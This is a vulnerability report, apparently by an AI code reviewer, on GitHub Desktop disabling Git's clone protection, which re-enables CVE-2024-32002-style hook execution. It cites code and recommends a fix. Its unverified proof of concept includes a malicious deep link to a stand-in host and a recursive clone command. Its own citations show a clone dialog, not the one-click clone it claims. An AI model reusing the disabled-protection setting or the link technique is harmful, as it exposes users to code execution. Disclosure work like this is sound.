## Finding: Git's built-in clone-time RCE protection is explicitly disabled by Desktop

### Title
Disabled Git submodule-clone protection re-enables hook-execution RCE on `clone` - (File: `app/src/lib/git/clone.ts`)

### Summary
Desktop's `clone()` helper unconditionally sets `GIT_CLONE_PROTECTION_ACTIVE: 'false'` for every clone it performs, which turns off the safety check Git itself ships to prevent a malicious repository (used as a submodule) from planting and auto-executing a hook during a recursive clone on case-insensitive/case-mangling filesystems (the default on macOS and Windows).

### Finding Description
`clone()` builds its environment as: [1](#0-0) 
and always runs `git clone --recursive -- <url> <path>`: [2](#0-1) 

`GIT_CLONE_PROTECTION_ACTIVE` is Git's own opt-out switch for the hardening it added against embedded-`.git`/submodule hook-planting attacks on case-insensitive filesystems (the class of bug fixed as CVE-2024-32002 upstream). By hard-coding this to `'false'`, Desktop deliberately disables that protection for *every* clone it invokes — including ones triggered from attacker-influenced entry points:

- The "Open in Desktop" deep link (`x-github-client://openrepo/<url>`), parsed with essentially no restriction on the URL value itself: [3](#0-2) 
- routed to `handleAppURL` → `dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository`, which ultimately calls the clone flow: [4](#0-3) 
- The manual "Clone repository" dialog, and the `--cli-clone` command-line entry point: [5](#0-4) 

None of the other guards found in this codebase (`isClonePathSensitive`, `sanitizeCloneName`, `resolveWithin`, branch-name sanitization) address this issue — those all defend against *path traversal* into the local filesystem, not against a hostile *remote repository* abusing Git's own recursive-submodule-clone hook execution. There is no `protocol.*.allow` restriction or other mitigation layered on top to compensate for disabling `GIT_CLONE_PROTECTION_ACTIVE`.

### Impact Explanation
An attacker who controls a repository (or a submodule referenced by that repository) that a Desktop user is enticed to clone — via a normal "Clone repository" action, a `--cli-clone` argument, or simply clicking an `x-github-client://openrepo/...` link on a malicious web page — can, on the default case-insensitive filesystems used by macOS (APFS) and Windows (NTFS), plant a working hook (e.g. `post-checkout`) that executes automatically as part of `git clone --recursive`, resulting in arbitrary code execution on the victim's machine before the user has made any trust decision about the repository's contents. This is exactly the class of "attacker controls a cloned/fetched repository … result is code execution" that is in scope.

### Likelihood Explanation
High. The vulnerable code path (`clone --recursive` with protection disabled) is exercised unconditionally on every clone Desktop performs, and one of the trigger surfaces (the `openrepo` deep link) requires nothing more than the user clicking a link — no local access, no admin rights, and no prior compromise. The affected filesystems (default macOS/Windows configurations) cover the large majority of Desktop's user base.

### Recommendation
Remove the `GIT_CLONE_PROTECTION_ACTIVE: 'false'` override in `clone()` so Desktop honors Git's default hardening against case-insensitive-filesystem submodule/hook attacks. If there was a specific compatibility reason for disabling it, that reasoning should be re-evaluated and, at minimum, the override should not apply to clones originating from untrusted/attacker-suppliable URLs (deep links, CLI clone of arbitrary URLs). Add a regression test that asserts the environment passed to `git clone` does not disable this protection.

### Proof of Concept
Conceptual reproduction (I could not execute this in the sandboxed index, so treat as a description of the known technique rather than a verified transcript):
1. Attacker creates/hosts a Git repository `evil.git` containing a submodule whose path is chosen so that, once checked out on a case-insensitive filesystem, it collides with a location Git treats specially (as in the public CVE-2024-32002 write-up), placing a working `post-checkout` (or similar) hook that Git will treat as valid rather than skip.
2. Attacker publishes a link: `x-github-client://openrepo/https://evil.example/evil.git`.
3. Victim (on macOS/Windows) clicks the link; Desktop parses it via `parseAppURL` [3](#0-2)  and routes it to `openOrCloneRepository` → `clone()`.
4. `clone()` runs `git clone --recursive -- https://evil.example/evil.git <path>` with `GIT_CLONE_PROTECTION_ACTIVE=false` in the environment [1](#0-0) , disabling Git's own check that would otherwise refuse/neutralize the planted hook.
5. During the recursive submodule checkout, the planted hook executes with the victim's privileges.

Because I could not build and run an actual exploit repository in this environment, I cannot certify end-to-end exploitation here — this should be validated by a Devin session with full filesystem/terminal access, which can construct the collision payload per the CVE-2024-32002 technique and confirm hook execution against this exact `clone()` invocation.

### Citations

**File:** app/src/lib/git/clone.ts (L81-93)
```typescript
  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]
```

**File:** app/src/lib/git/clone.ts (L119-126)
```typescript
  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
```

**File:** app/src/lib/parse-app-url.ts (L98-125)
```typescript
  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2215-2233)
```typescript
  private async openOrCloneRepository(url: string): Promise<Repository | null> {
    const state = this.appStore.getState()
    const repositories = state.repositories
    const existingRepository = repositories.find(r =>
      this.doesRepositoryMatchUrl(r, url)
    )

    if (existingRepository) {
      return await this.selectRepository(existingRepository)
    }

    return this.appStore._startOpenInDesktop(() => {
      this.changeCloneRepositoriesTab(CloneRepositoryTab.Generic)
      this.showPopup({
        type: PopupType.CloneRepository,
        initialURL: url,
      })
    })
  }
```

**File:** app/src/main-process/main.ts (L282-291)
```typescript
  if (typeof args['cli-open'] === 'string') {
    handleCLIAction({ kind: 'open-repository', path: args['cli-open'] })
  } else if (typeof args['cli-clone'] === 'string') {
    handleCLIAction({
      kind: 'clone-url',
      url: args['cli-clone'],
      branch:
        typeof args['cli-branch'] === 'string' ? args['cli-branch'] : undefined,
    })
  }
```
